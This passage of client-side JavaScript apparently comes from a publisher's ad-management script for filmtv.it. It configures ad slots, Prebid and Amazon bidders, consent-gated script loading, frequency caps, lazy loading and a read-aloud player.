          debug && console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", "failed inserting intext div:", div_id);
        }
      }
      c.parentNode.insertBefore(containerDiv, c.nextSibling);
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up div for intext:", div);
      // reset previousAdvHeight so that we keep correct track of distances
      previousAdvHeight = pBottom;
    } else {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skipping candidate for intext - c.offsetTop:", c.offsetTop, "next position:", previousAdvHeight + distance, c);
    }
  });
  if (richMediaSlotQueue.length > 0) {
    richMediaSlotQueue.forEach(function (slot) {
      window._gmp.setupRichMediaSlot(slot);
    });
  }
  if (intextSlotQueue.length > 0) {
    intextSlotQueue.forEach(function (slot) {
      window._gmp.setupSlot(slot);
    });
  }
};
window._gmp.invokeReadAloud = function () {
  var adTagURL = new URL('');
  var curURL = window.location.href;
  adTagURL.searchParams.set('description_url', curURL);
  console.log('current page URL', curURL);
  console.log('data-ad-tag-url', adTagURL);
  var player = document.createElement('google-read-aloud-player');
  player.setAttribute('data-api-key', 'AIzaSyBYZ7BK9ojqp7cQy5vfm2tcilwxxSiWhbw');
  player.setAttribute('data-tracking-ids', 'UA-168915890-12');
  player.setAttribute('data-url', curURL);
  player.setAttribute('data-voice', 'it-it-f-1');
  player.setAttribute('data-ad-tag-url', adTagURL);

  // read player foreground color (icon color) from site configuration
  player.setAttribute('data-foreground-color', '#000000');

  // docking-styles

  player.setAttribute('data-no-docking', '');
  player.setAttribute('data-highlight-mode', "off");
  player.setAttribute('data-no-autoscroll', '');
  player.setAttribute('data-seek-on-tap', "off");
  window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "read aloud player element", player);
  var p = document.getElementById('gmp-text-to-speech');
  p.appendChild(player);
  var script1 = document.createElement('script');
  script1.setAttribute('src', 'https://imasdk.googleapis.com/js/sdkloader/ima3.js');
  document.head.appendChild(script1);
  var script2 = document.createElement('script');
  script2.setAttribute('src', 'https://www.gstatic.com/readaloud/player/web/api/js/api.js');
  document.head.appendChild(script2);
  var script3 = document.createElement('script');
  script3.setAttribute('src', 'https://www.google-analytics.com/analytics.js');
  document.head.appendChild(script3);
  var script4 = document.createElement('script');
  script4.innerText = "window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date";
  document.head.appendChild(script4);
};

/**
 * Async load a script running a callback function when the script has been successfully loaded
 *
 * @param {string} config
 * @param {function} callback
 */
window._gmp.loadScript = function (config, callback) {
  var debug = window._gmp.debug;
  if (document.querySelector('script[src="' + config.url + '"]')) {
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "loadScript: script already loaded:", config.url);
    return;
  }
  if (window._gmp.consentNeeded && 'vendorId' in config && config.needsConsent && !(window._gmp.consentData.hasOwnProperty(config.vendorId) && window._gmp.consentData[config.vendorId])) {
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", config.provider, "needs consent but does not have it - skipping");
    return;
  }
  var script = document.createElement("script");
  script.type = "text/javascript";
  if ('data' in config) {
    for (var d in config.data) {
      script.setAttribute(d, config.data[d]);
    }
  }
  if (script.readyState) {
    // only required for IE <9
    script.onreadystatechange = function () {
      if (script.readyState === "loaded" || script.readyState === "complete") {
        script.onreadystatechange = null;
        callback();
      }
    };
  } else {
    //Others
    script.onload = function () {
      callback();
    };
  }
  script.src = config.url;
  document.getElementsByTagName("head")[0].appendChild(script);
};

/**
 * Add necessary scripts to config
 */
window._gmp.scriptsToLoad = [{
  dio: 'cane'
}, {
  provider: 'gam',
  url: 'https://securepubads.g.doubleclick.net/tag/js/gpt.js',
  immediate: true,
  needsConsent: false,
  limitedConsentUrl: 'https://pagead2.googlesyndication.com/tag/js/gpt.js'
}, {
  provider: 'prebid',
  url: 'https://s.adplay.it/filmtv/prebid.js',
  immediate: true,
  needsConsent: false
}, {
  provider: 'a9',
  url: 'https://c.amazon-adsystem.com/aax2/apstag.js',
  immediate: true,
  vendorId: 793,
  needsConsent: true,
  preflight: function () {
    if (!window._gmp.consentNeeded || !!window._gmp.consentData[793]) {
      window._gmp.apsEnabled = true;
    }
    window.apstag = window.apstag || {
      init: function () {
        apstag._Q.push(["i", arguments, new Date().getTime()]);
      },
      fetchBids: function () {
        apstag._Q.push(["f", arguments, new Date().getTime()]);
      },
      setDisplayBids: function () {},
      _Q: []
    };
    apstag.init({
      pubID: window._gmp.apstagPubID,
      deals: true,
      adServer: 'googletag',
      bidTimeout: window._gmp.bidderTimeout,
      schain: {
        validation: "strict",
        ver: "1.0",
        complete: 1,
        nodes: window._gmp.schainConfigNodes
      }
    });
  }
}];

/**
 * Map of available scripts - TODO: deprecate
 */
// Define and set jshook for tracking events
window.jshook = function (name) {
  console.log(`The event ${name} is triggered`);
};
window._gmp.slotScripts = {};

/**
 * Map of units we have available for the page, including bidder data
 */
window._gmp.unitMap = window._gmp.unitMap || {
  "/22248368690,22654347272/filmtv.it_intropage": {
    "pbSizes": [[300, 250], [336, 280], [970, 250], [300, 600], [320, 500], [320, 400], [320, 600], [340, 210]],
    "apsSizes": [[300, 250], [336, 280], [970, 250], [300, 600], [320, 500], [320, 400], [320, 600], [340, 210]],
    "gamSizes": [[300, 250], [336, 280], [970, 250], [300, 600], [320, 480], [1000, 620], [320, 500], [320, 400], [320, 600], [340, 210]],
    "bidderData": [{
      "bidder": "appnexus",
      "params": {
        "placementId": "31102870"
      }
    }, {
      "bidder": "criteo",
      "params": {
        "networkId": 10898
      }
    }, {
      "bidder": "improvedigital",
      "params": {
        "placementId": 23042033,
        "publisherId": 905
      }
    }, {
      "bidder": "adf",
      "params": {
        "mid": 1787791
      }
    }, {
      "bidder": "openx",
      "params": {
        "delDomain": "publyltd-d.openx.net",
        "unit": "559816985"
      }
    }, {
      "bidder": "rubicon",
      "params": {
        "accountId": "23164",
        "siteId": "515894",
        "zoneId": "3099680"
      }
    }]
  },
  "/22248368690,22654347272/filmtv.it_insidepost_vlyby": {
    "pbSizes": [[300, 250], [336, 280]],
    "apsSizes": [[300, 250], [336, 280]],
    "gamSizes": [[300, 250], [336, 280]]
  }
};

/**
 * Map of slots we have available for the page
 */
window._gmp.slotMap = window._gmp.slotMap || {
  "gmp-vip": {
    "devices": ["desktop", "mobile"],
    "force": true,
    "immediate": true,
    "type": "normal",
    "innerHTML": "<ins data-id=\"6d3674c49af4071e414d4adbab038085\" data-type=\"video-template-outstream\"></ins>\r\n<script async src=\"https://bb1.broadbandy.net/display/app.js\"></script>",
    "insert": {
      "selector": "body",
      "position": "append"
    }
  },
  "gmp-intropage_passback": {
    "devices": ["desktop", "mobile"],
    "force": true,
    "immediate": true,
    "type": "normal",
    "innerHTML": "<div class=\"adk-slot interstitial\">\r\n  <div id=\"adk_interstitial0\"></div>\r\n  <div id=\"adk_interstitial\"></div>\r\n</div>\r\n\r\n<script type='module' defer>\r\n\timport { start } from 'https://cdn.adkaora.space/adplay/generic/prod/adk-init.js'\r\n</script>",
    "insert": {
      "selector": "body",
      "position": "append"
    }
  },
  "gmp-intropage": {
    "devices": ["desktop", "mobile"],
    "force": true,
    "immediate": true,
    "type": "intropage",
    "unit": "/22248368690,22654347272/filmtv.it_intropage",
    "apsSizes": [[300, 250], [336, 280], [970, 250], [300, 600], [320, 500], [320, 400], [320, 600], [340, 210]],
    "gamSizes": [[300, 250], [336, 280], [970, 250], [300, 600], [320, 480], [1000, 620], [320, 500], [320, 400], [320, 600], [340, 210]],
    "onEmptyAdSlot": "gmp-intropage_passback",
    "frequencyCap": {
      "hourly": 1,
      "daily": 0
    },
    "insert": {
      "selector": "body",
      "position": "append"
    }
  },
  "gmp-injections": {
    "devices": ["desktop", "mobile"],
    "force": true,
    "immediate": true,
    "type": "normal",
    "innerHTML": "<script>(function(){\r\n    function waitForElm(selector) {\r\n        return new Promise(resolve => {\r\n            if (document.querySelector(selector)) {\r\n                return resolve(document.querySelector(selector));\r\n            }\r\n            const observer = new MutationObserver(mutations => {\r\n                if (document.querySelector(selector)) {\r\n                    observer.disconnect();\r\n                    resolve(document.querySelector(selector));\r\n                }\r\n            });\r\n\r\n            observer.observe(document.body, {\r\n                childList: true,\r\n                subtree: true\r\n            });\r\n        });\r\n    }\r\n    waitForElm('.bb-main-container').then((bbCustom) => {\r\n        const p=bbCustom.parentNode.style.right=0;\r\n    });\r\n})()\r\n</script>",
    "insert": {
      "selector": "body",
      "position": "append"
    }
  }
};

/**
 * Should we show this slot to the current user ?
 *
 * @return boolean
 */
window._gmp.isSlotToBeShown = function (slot) {
  var debug = window._gmp.debug || false;
  var slotId = typeof slot === 'string' ? slot : slot.id;
  if (slotId in window._gmp.slotMap && window._gmp.slotMap[slotId].hasOwnProperty('isFallbackSlot')) {
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "slot is in fallback list - not showing: #", slotId);
    return false;
  }
  if (window._gmp.disabledSlots && window._gmp.disabledSlots.includes(slotId)) {
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "slot is in disabled list - not showing: #", slotId);
    return false;
  }
  if (window._gmp.userType == 'subscriber') {
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "user is a subscriber - checking whether to show slot", slot);
    if (typeof slot === 'string') {
      if (slotId in window._gmp.slotMap) {
        slot = window._gmp.slotMap[slotId];
      } else {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "slot with id ", slotId, "not found in slotMap - not showing");
        return false;
      }
    }
    if (window._gmp.slotMap[slotId] && window._gmp.slotMap[slotId].hasOwnProperty('showToSubscribers')) {
      // from slotMap
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "showing slot to subscriber from slotMap:", slot);
      return true;
    }
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "not showing slot to subscriber:", slot);
    return false;
  }
  return true;
};
window._gmp.advINIT = function (consentState) {
  window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "in advINIT - consentState:", consentState);
  if (window._gmp.initRun) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "init already run - bailing");
    return;
  }
  window._gmp.initRun = true;
  var advStartEvent = document.createEvent('Event');
  advStartEvent.initEvent('advinit');
  document.dispatchEvent(advStartEvent);
  window._gmp.advStart = true;
  window._gmp.adObserver = null;
  window._gmp.refreshObserver = null;
  window._gmp.prebidInit = null;
  var debug = window._gmp.debug || false;
  if (window._gmp.userType == 'subscriber') {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "paying user - showing only some adv - type:", window._gmp.userType);
  }

  // Load necessary script
  window._gmp.scriptsToLoad.map(function (config) {
    if (!config.hasOwnProperty('immediate') || !config.immediate) {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "skipping preloading for", config.provider, " - not marked as 'immediate'");
      return;
    }
    if ('preflight' in config) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", config.provider, "preflight");
      config.preflight();
    }

    /**
     * If we have consent only for limited ads load the alternate script URL for GAM
     */
    if (config.provider == 'gam' && window._gmp.googleLimitedConsent) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", config.provider, "preflight");
      config.url = config.limitedConsentUrl;
    }
    if (window._gmp.consentNeeded && 'vendorId' in config && config.needsConsent && !(window._gmp.consentData.hasOwnProperty(config.vendorId) && window._gmp.consentData[config.vendorId])) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", config.provider, "needs consent but does not have it - skipping");
      return;
    }
    if ('code' in config) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "embedding code for", config.provider);
      var elm = document.createElement("div");
      document.body.appendChild(elm);
      window._gmp.setInnerHTML(elm, config.code);
    }
    if (config.url) {
      window._gmp.loadScript(config, function () {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", config.provider, "script loaded!");
        if ('callback' in config) {
          config.callback();
        }
        ;
      });
    }
  });

  /**
   * Whenever an adv div gets within 50px of the viewport we run the invocation
   *
   * @param {Array} entries
   * @param {IntersectionObserver} observer
   */
  var ioCallback = function (entries, observer) {
    entries.forEach(function (entry) {
      if (entry.isIntersecting) {
        var delayedAdvId = entry.target.id;
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "entry intersecting:", delayedAdvId);
        if (delayedAdvId in window._gmp.delayedGAMSlots) {
          var delayedSlot = window._gmp.delayedGAMSlots[delayedAdvId];
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "GAM delayed invocation for:", delayedAdvId);
          window._gmp.requestBids(delayedSlot);
        } else if (delayedAdvId in window._gmp.delayedRichMediaLoaders) {
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "rich media delayed invocation:", delayedAdvId);
          window._gmp.delayedRichMediaLoaders[delayedAdvId]();
        }
        observer.unobserve(entry.target);
      }
    });
  };
  var gamRefreshCallback = function (entries, observer) {
    entries.forEach(function (entry) {
      if (entry.isIntersecting) {
        var gamRefreshSlotID = entry.target.id;
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "entry intersecting - asking GAM for refresh:", gamRefreshSlotID);
        if (gamRefreshSlotID in window._gmp.gamSlots) {
          var slot = window._gmp.gamSlots[gamRefreshSlotID];
          window._gmp.gamRefreshQueue.push(slot);
        }
        observer.unobserve(entry.target);
      }
    });
  };
  var refreshCallback = function (entries, observer) {
    entries.forEach(function (entry) {
      if (entry.isIntersecting) {
        var refreshSlotID = entry.target.id;
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "entry intersecting - asking for refresh:", refreshSlotID);
        if (refreshSlotID in window._gmp.gamSlots) {
          var slot = window._gmp.gamSlots[refreshSlotID];
          googletag.pubads().clear([slot]);
          // googletag.pubads().refresh([slot]);
          var currentSlot = window._gmp.slotInfoForRefresh[refreshSlotID];
          window._gmp.requestBids(currentSlot);
        }
        observer.unobserve(entry.target);
      }
    });
  };
  if ('IntersectionObserver' in window) {
    // Activate intersection observer when the observed element
    // has even one pixel within 50px of the viewport
    var iOptions = {
      root: null,
      rootMargin: '0px 0px 50px 0px',
      threshold: 0
    };
    window._gmp.adObserver = new IntersectionObserver(ioCallback, iOptions);
    window._gmp.gamRefreshObserver = new IntersectionObserver(gamRefreshCallback, iOptions); // TODO: make sure that batch auction is run correctly when no intersection observer is available
    window._gmp.refreshObserver = new IntersectionObserver(refreshCallback, iOptions); // TODO: adapt ioCallback for use also in refreshObserver
  }

  /**
   * Update info on tracking object
   * @param string slotId the id of the ad server slot
   * @param string provider (gam, xandr or one of the rich media providers)
   * @param string state (defined|requested|rendered)
   * @param googletag.events.SlotRenderEndedEvent event - optional, default null
   *
   * @todo get winning bids thorugh pbjs.getAllWinningBids() ?
   */
  window._gmp.addSlotTrackingInfo = function (slotId, provider, state, event) {
    window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "updating tracking info for:", slotId, "- state:", state);
    try {
      var slot = document.getElementById(slotId);
      window._gmp.track.slots[slotId] = window._gmp.track.slots[slotId] || {
        provider: provider,
        gamInfo: provider != 'gam' ? null : {
          adUnitPath: slot.dataset.adUnit.startsWith('/') ? slot.dataset.adUnit : window._gmp.gamPrefix + slot.dataset.adUnit,
          biddersReturned: []
        }
      };
      /**
       * mark tracker as changed
       */
      window._gmp.trackChangedSinceSent = true;
      window._gmp.track.slots[slotId].state = state;
      if (window._gmp.track.navigationStart) {
        if (state == 'requested') {
          window._gmp.track.slots[slotId].requestedAfter = Math.round(performance.now());
        } else if (state == 'rendered') {
          window._gmp.track.slots[slotId].renderedAfter = Math.round(performance.now());
          window._gmp.track.slots[slotId].offsetTop = slot.offsetTop;
        }
      }
      if (provider == 'gam' && state == 'rendered' && typeof event !== "undefined") {
        window._gmp.track.slots[slotId].gamInfo.empty = event.isEmpty;
        window._gmp.track.slots[slotId].gamInfo.size = event.size;
        var biddersReturned = JSON.parse(slot.dataset.biddersReturned);
        window._gmp.track.slots[slotId].gamInfo.biddersReturned = biddersReturned;
        /**
         * Add prebid targeting info, if any
         */
        if (Array.isArray(biddersReturned) && biddersReturned.indexOf('prebid') > -1) {
          var targeting = pbjs.getAdserverTargetingForAdUnitCode(slotId);
          ['hb_pb', 'hb_bidder', 'hb_size'].forEach(function (k) {
            if (k in targeting) {
              try {
                // hb_size is of the form 728x90
                if (k == 'hb_size') {
                  window._gmp.track.slots[slotId].gamInfo[k] = targeting[k].split('x').map(function (x) {
                    return parseInt(x);
                  });
                } else if (k == 'hb_pb') {
                  window._gmp.track.slots[slotId].gamInfo[k] = parseFloat(targeting[k]);
                } else {
                  window._gmp.track.slots[slotId].gamInfo[k] = targeting[k];
                }
              } catch (err) {
                console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error converting tracking info for:", k);
              }
            }
          });
        }
      }
    } catch (err) {
      console.warn("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error while setting up tracking info:", slotId, err);
    }
  };

  /**
   * Set up a Rich media slot
   *
   * @param {Element} slot
   * @param {boolean} rightNow should we load this rich-media slot immediately
   */
  window._gmp.setupRichMediaSlot = function (slot, rightNow) {
    var keyName = '_gmp_' + slot.id + '_shown';
    var shown = null;
    var debug = window._gmp.debug;
    if (!window._gmp.isSlotToBeShown(slot)) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "not setting up rich media slot", slot.id, "for user of type", window._gmp.userType);
      return;
    }
    if (!slotMap[slot.id].hasOwnProperty('innerHTML') && !slotMap[slot.id].hasOwnProperty('customScript')) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "slot: ", slot.id, " has neither custom html nor custom script");
      return;
    }
    if (slot.id in window._gmp.slotMap && 'frequencyCap' in window._gmp.slotMap[slot.id]) {
      shown = window._gmp.getShownInfo(keyName);
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "shown info for", slot.id, ":", shown);
      // If we have shown at least one in the last hour, avoid
      if (window._gmp.slotMap[slot.id].frequencyCap.hourly && shown.byInterval.hour >= window._gmp.slotMap[slot.id].frequencyCap.hourly) {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "too many shown in hour for", slot.id, ", bailing:", shown.byInterval.hour);
        return;
      }

      // If we have shown at least three in the last day, avoid
      if (window._gmp.slotMap[slot.id].frequencyCap.daily && shown.byInterval.day >= window._gmp.slotMap[slot.id].frequencyCap.daily) {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "too many shown in day for", slot.id, ", bailing:", shown.byInterval.day);
        return;
      }
    }
    debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "doing rich media slot: ", slot.id);
    if (slot.dataset.type in window._gmp.components && typeof window._gmp.components[slot.dataset.type].preRender == 'function') {
      window._gmp.components[slot.dataset.type].preRender(slot);
    }
    var innerHTML = window._gmp.slotMap[slot.id].hasOwnProperty('innerHTML') ? window._gmp.slotMap[slot.id].innerHTML : '';

    /**
     * TODO: deprecate
     */
    if (slot.id in window._gmp.slotScripts) {
      innerHTML += window._gmp.slotScripts[slot.id].code;
    }
    var loaderFunction = function () {
      try {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", slot.id, ' rich media slot loaded!');
        window._gmp.setInnerHTML(slot, innerHTML);
        window._gmp.addSlotTrackingInfo(slot.id, 'richmedia', 'rendered');
        if (slot.id in window._gmp.slotMap && 'frequencyCap' in window._gmp.slotMap[slot.id]) {
          window._gmp.updateShown(keyName, shown);
        }
      } catch (err) {
        debug && console.error("%c[gmp]", "background: rgb(242, 148, 0); color: white", "error while setting up custom script for slot:", slot.id, "-", err);
      }
    };
    if (rightNow || !window._gmp.adObserver) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "immediate invocation for rich media slot ", slot.id);
      loaderFunction();
    } else {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up delayed invocation for rich media ", slot.id);
      window._gmp.delayedRichMediaLoaders[slot.id] = loaderFunction;
      window._gmp.adObserver.observe(slot);
    }
  };

  /**
   * Set up a GAM slot for pre-bidding
   *
   * @param {Element} slot
   * @param {boolean} rightNow should we load this slot immediately
   */
  window._gmp.setupSlot = function (slot, rightNow) {
    var currentSlot = {
      domElement: slot,
      pbUnit: null,
      gamUnit: null
    };
    var keyName = '_gmp_' + slot.id + '_shown';
    var shown = null;
    if (!window._gmp.isSlotToBeShown(slot)) {
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "not setting up slot", slot.id, "for user of type", window._gmp.userType);
      return;
    }
    if (slot.id in slotMap && 'frequencyCap' in window._gmp.slotMap[slot.id]) {
      shown = window._gmp.getShownInfo(keyName);
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "shown info for", slot.id, ":", shown);
      // If we have shown at least one in the last hour, avoid
      if (window._gmp.slotMap[slot.id].frequencyCap.hourly && shown.byInterval.hour >= window._gmp.slotMap[slot.id].frequencyCap.hourly) {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "too many shown in hour for", slot.id, ", bailing:", shown.byInterval.hour);
        return;
      }

      // If we have shown at least three in the last day, avoid
      if (window._gmp.slotMap[slot.id].frequencyCap.daily && shown.byInterval.day >= window._gmp.slotMap[slot.id].frequencyCap.daily) {
        window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "too many shown in day for", slot.id, ", bailing:", shown.byInterval.day);
        return;
      }
    }
    if (slot.dataset.type in window._gmp.components && typeof window._gmp.components[slot.dataset.type].preRender == 'function') {
      window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "running preRender hook for:", slot.id, "- type:", slot.dataset.type);
      window._gmp.components[slot.dataset.type].preRender(slot);
    }

    /**
     * Ad unit path
     */
    var adUnitPath = slot.dataset.adUnit.startsWith('/') ? slot.dataset.adUnit : window._gmp.gamPrefix + slot.dataset.adUnit;

    /**
     * First we set up prebid ad units
     */
    try {
      /**
       * Due to scoping and not being able to use ES6 lets we have
       * to store the current slot in a closure to avoid it being always
       * the last slot defined
       */
      var gamInitFunction = function () {
        // Store the resulting slot definition to use later in refreshing
        var currSlot = slot;
        var currKeyName = keyName;
        var currShown = shown;
        return function () {
          var path = adUnitPath;
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "defining slot ", currSlot.id);
          window._gmp.gamSlots[currSlot.id] = googletag.defineSlot(path, JSON.parse(currSlot.dataset.gamSizes), currSlot.id).addService(googletag.pubads());
          window._gmp.gamSlots[currSlot.id].setTargeting('slotpos', window._gmp.getSlotPos(path));
          /* TODO: we should have a targeting key for below-the-fold slots that are not immediately viewable
          if (currSlot.dataset.immediate) {
              window._gmp.gamSlots[currSlot.id].setTargeting('immediate', 1);
          }
          */
          if (currSlot.id in window._gmp.slotMap && window._gmp.slotMap[currSlot.id].hasOwnProperty('disableDirectDeal')) {
            window._gmp.gamSlots[currSlot.id].setTargeting('gmp-viewability', 'low');
          }
          if (currSlot.dataset.type && currSlot.dataset.type != "normal") {
            window._gmp.gamSlots[currSlot.id].setTargeting('gmp-type', currSlot.dataset.type);
          }
          googletag.display(currSlot.id);
          if (currShown) {
            window._gmp.updateShown(currKeyName, currShown);
          }
          window._gmp.addSlotTrackingInfo(currSlot.id, 'gam', 'defined');
        };
      };
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up gamUnit:", slot.dataset);
      currentSlot.gamUnit = {
        adUnitPath: adUnitPath,
        size: JSON.parse(slot.dataset.gamSizes),
        id: slot.id
      };
      if ('apsSizes' in slot.dataset) {
        currentSlot.gamUnit.apsSizes = JSON.parse(slot.dataset.apsSizes);
      }
      if (slot.dataset.adUnit in window._gmp.unitMap && window._gmp.unitMap[slot.dataset.adUnit] && ('bidderData' in slot.dataset || 'bidderData' in window._gmp.unitMap[slot.dataset.adUnit]) && ('pbSizes' in slot.dataset || 'pbSizes' in window._gmp.unitMap[slot.dataset.adUnit])) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up pbUnit:", slot);
        currentSlot.pbUnit = function () {
          var pbSizes = 'pbSizes' in slot.dataset ? JSON.parse(slot.dataset.pbSizes) : window._gmp.unitMap[slot.dataset.adUnit].pbSizes;
          var pbs = pbSizes.map(function (e) {
            return JSON.stringify(e);
          });
          var bm = 'bidderData' in slot.dataset ? slot.dataset.bidderData : window._gmp.unitMap[slot.dataset.adUnit].bidderData;
          var gpid = slot.dataset.adUnit + "#" + slot.id;
          var mediaTypes = {
            banner: {
              sizes: pbSizes || window._gmp.unitMap[slot.dataset.adUnit].pbSizes
            }
          };
          if (slot.dataset.native && slot.dataset.native > 0) {
            mediaTypes.native = {
              sendTargetingKeys: !1,
              ortb: {
                assets: [{
                  id: 1,
                  required: 1,
                  img: {
                    type: 3,
                    w: 150,
                    h: 50
                  }
                }, {
                  id: 2,
                  required: 1,
                  title: {
                    len: 80
                  }
                }, {
                  id: 3,
                  required: 1,
                  data: {
                    type: 1
                  }
                }, {
                  id: 4,
                  required: 1,
                  data: {
                    type: 2
                  }
                }, {
                  id: 6,
                  required: 1,
                  img: {
                    type: 1,
                    w: 50,
                    h: 50
                  }
                }]
              }
            };
          }
          if (slot.dataset.video && slot.dataset.video > 0) {
            mediaTypes.video = {
              context: 'outstream',
              playerSize: [640, 480],
              mimes: ['video/mp4'],
              protocols: [1, 2, 3, 4, 5, 6, 7, 8],
              playbackmethod: [2],
              skip: 1
            };
          }
          return {
            code: slot.id,
            ortb2Imp: {
              ext: {
                gpid: gpid,
                data: {
                  pbadslot: gpid
                }
              }
            },
            mediaTypes: mediaTypes,
            pubstack: {
              adUnitPath: slot.dataset.adUnit
            },
            bids: bm.filter(function (bidder) {
              if (bidder.bidder == 'ix' && 'size' in bidder.params) {
                var s = JSON.stringify(bidder.params.size);
                if (pbs.indexOf(s) == -1) {
                  debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "size", s, "not in", pbSizes);
                  return false;
                }
              }
              if (bidder.bidder == 'sublime') {
                bidder.params.notifyId = function () {
                  window.sublime = window.sublime || {};
                  window.sublime.notifyId = window.sublime.notifyId || function b(a) {
                    return a ? (a ^ Math.random() * 16 >> a / 4).toString(16) : ([1e7] + -1e3 + -4e3 + -8e3 + -1e11).replace(/[018]/g, b);
                  }();
                  return window.sublime.notifyId;
                }();
              }
              if (bidder.bidder == 'quantum_i') {
                bidder.sizeConfig = [{
                  'minViewPort': [0, 0],
                  'relevantMediaTypes': ['native']
                }];
              }
              return true;
            })
          };
        }();
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "new pbUnit:", currentSlot.pbUnit);
      } else {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "ad unit not in unitMap or no bidder data for unit:", slot.dataset.adUnit);
      }

      // Set up slot
      googletag.cmd.push(gamInitFunction());
      window._gmp.slotInfoForRefresh[slot.id] = currentSlot;
      if (window._gmp.adObserver) {
        window._gmp.delayedGAMSlots[slot.id] = currentSlot;
        if (slot.dataset.type in window._gmp.components && typeof window._gmp.components[slot.dataset.type].hasObserver != 'undefined' && window._gmp.components[slot.dataset.type].hasObserver) {
          window._gmp.debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "avoid setting up observer for:", slot.id);
          googletag.cmd.push(function () {
            /**
             * @todo update gmp-ready-to-observe-* to add to auction queue
             */
            window.dispatchEvent(new CustomEvent('gmp-ready-to-observe-' + slot.dataset.type, {
              detail: {
                slot: slot.id
              },
              bubbles: false,
              cancelable: false,
              composed: false
            }));
          });
        } else {
          debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "setting up delayed invocation for ", slot.id);
          window._gmp.auctionQueue.push(currentSlot);
        }
      }
    } catch (err) {
      console.error("[gmp] error while setting up candidate div:", slot, err);
    }
  };
  window._gmp.setupFallbackAdSlots = function (forcedFallbacAdSlot, fallbackSlotId) {
    console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "Fallback  slots for ", fallbackSlotId);
    for (var forcedAdSlot of forcedFallbacAdSlot) {
      if (!(forcedAdSlot in window._gmp.slotMap)) {
        debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "fallabackAdSlot", forcedAdSlot, " not found in slotMap");
        continue;
      }
      debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "prepare fallabackAdSlot slot", forcedAdSlot);
      delete window._gmp.slotMap[forcedAdSlot].isFallbackSlot;
      if (window._gmp.slotMap[forcedAdSlot].type in window._gmp.components && typeof window._gmp.components[window._gmp.slotMap[forcedAdSlot].type].init == 'function') {
        window._gmp.components[window._gmp.slotMap[forcedAdSlot].type].init(forcedAdSlot);
      } else {
        if (window._gmp.slotMap[forcedAdSlot].force && !window._gmp.slotMap[forcedAdSlot].hasOwnProperty('insert')) {
          if (fallbackSlotId) {
            if (!(fallbackSlotId in window._gmp.slotMap)) {
              debug && console.log("%c[gmp]", "background: rgb(242, 148, 0); color: white", "fallabackAdSlot", forcedAdSlot, " not found parent slot ", fallbackSlotId, "in slotMap");
              continue;
            }
            if (window._gmp.slotMap[fallbackSlotId].force && window._gmp.slotMap[fallbackSlotId].hasOwnProperty('insert')) {
              window._gmp.slotMap[forcedAdSlot].insert = window._gmp.slotMap[fallbackSlotId].insert;
            } else {
              window._gmp.slotMap[forcedAdSlot].insert = {
                "position": "append",
                "selector": '#' + fallbackSlotId
              };
            }
          }
        }
        window._gmp.forceAdSlot(forcedAdSlot);
